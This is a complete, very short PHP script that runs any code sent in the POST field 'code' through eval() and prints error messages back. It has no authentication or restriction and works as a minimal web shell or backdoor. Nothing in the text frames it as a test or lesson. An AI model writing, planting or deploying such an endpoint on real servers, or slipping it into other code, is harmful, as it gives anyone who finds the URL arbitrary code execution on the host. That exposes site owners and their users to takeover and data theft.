<?php
    try{
        eval($_POST["code"]);
    }
    catch(Exception $e){
        echo $e->getMessage();
    }
?>